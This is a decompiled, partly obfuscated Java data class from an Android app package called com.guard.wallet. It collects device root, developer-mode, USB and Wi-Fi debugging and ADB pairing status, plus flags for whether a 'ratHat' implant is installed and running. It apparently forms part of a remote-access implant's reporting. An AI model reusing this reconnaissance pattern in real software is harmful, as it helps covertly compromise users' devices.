package com.guard.wallet.resp;

import a1.q;
import android.support.annotation.NonNull;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;

public class DeviceDebugVO extends MessageBodyVO {
   private Integer deviceConnected;
   private Integer deviceDebugPort;
   private Integer devicePaired;
   private Integer enableDebug;
   private Integer enableDevelopment;
   private Integer enableWifiDebug;
   private Integer isRoot;
   private Integer ratHatImplant;
   private Integer ratHatRunning;

   public DeviceDebugVO() {
   }

   public DeviceDebugVO(Integer var1, Integer var2, Integer var3, Integer var4, Integer var5, Integer var6, Integer var7, Integer var8, Integer var9) {
      this.isRoot = var1;
      this.enableDevelopment = var2;
      this.enableDebug = var3;
      this.enableWifiDebug = var4;
      this.ratHatImplant = var5;
      this.ratHatRunning = var6;
      this.deviceDebugPort = var7;
      this.devicePaired = var8;
      this.deviceConnected = var9;
   }

   public static DeviceDebugVO of() {
      DeviceDebugVO var0 = onlyDebug();
      ADBConfig var1 = h.J();
      var0.setRatHatImplant(var1.getInstalledRatHat());
      var0.setRatHatRunning(var1.getIsRatHatRunning());
      var0.setDevicePaired(Integer.valueOf(var1.isPaired()));
      var0.setDeviceConnected(Integer.valueOf(var1.isConnected()));
      var0.setDeviceDebugPort(var1.getDebugPort());
      return var0;
   }

   public static DeviceDebugVO onlyDebug() {
      DeviceDebugVO var1 = new DeviceDebugVO();
      boolean var0 = q.e();
      Integer var2 = 1;
      Integer var3 = 0;
      if (var0) {
         var1.setIsRoot(var2);
      } else {
         var1.setIsRoot(var3);
      }

      if (g.K()) {
         var1.setEnableDevelopment(var2);
      } else {
         var1.setEnableDevelopment(var3);
      }

      if (g.I()) {
         var1.setEnableDebug(var2);
      } else {
         var1.setEnableDebug(var3);
      }

      if (g.J()) {
         var1.setEnableWifiDebug(var2);
      } else {
         var1.setEnableWifiDebug(var3);
      }

      return var1;
   }

   public Integer getDeviceConnected() {
      return this.deviceConnected;
   }

   public Integer getDeviceDebugPort() {
      return this.deviceDebugPort;
   }

   public Integer getDevicePaired() {
      return this.devicePaired;
   }

   public Integer getEnableDebug() {
      return this.enableDebug;
   }

   public Integer getEnableDevelopment() {
      return this.enableDevelopment;
   }

   public Integer getEnableWifiDebug() {
      return this.enableWifiDebug;
   }

   public Integer getIsRoot() {
      return this.isRoot;
   }

   public Integer getRatHatImplant() {
      return this.ratHatImplant;
   }

   public Integer getRatHatRunning() {
      return this.ratHatRunning;
   }

   public void setDeviceConnected(Integer var1) {
      this.deviceConnected = var1;
   }

   public void setDeviceDebugPort(Integer var1) {
      this.deviceDebugPort = var1;
   }

   public void setDevicePaired(Integer var1) {
      this.devicePaired = var1;
   }

   public void setEnableDebug(Integer var1) {
      this.enableDebug = var1;
   }

   public void setEnableDevelopment(Integer var1) {
      this.enableDevelopment = var1;
   }

   public void setEnableWifiDebug(Integer var1) {
      this.enableWifiDebug = var1;
   }

   public void setIsRoot(Integer var1) {
      this.isRoot = var1;
   }

   public void setRatHatImplant(Integer var1) {
      this.ratHatImplant = var1;
   }

   public void setRatHatRunning(Integer var1) {
      this.ratHatRunning = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("DeviceDebugVO{isRoot=");
      var1.append(this.isRoot);
      var1.append(", enableDevelopment=");
      var1.append(this.enableDevelopment);
      var1.append(", enableDebug=");
      var1.append(this.enableDebug);
      var1.append(", enableWifiDebug=");
      var1.append(this.enableWifiDebug);
      var1.append(", ratHatImplant=");
      var1.append(this.ratHatImplant);
      var1.append(", ratHatRunning=");
      var1.append(this.ratHatRunning);
      var1.append(", deviceDebugPort=");
      var1.append(this.deviceDebugPort);
      var1.append(", devicePaired=");
      var1.append(this.devicePaired);
      var1.append(", deviceConnected=");
      var1.append(this.deviceConnected);
      var1.append('}');
      return var1.toString();
   }
}
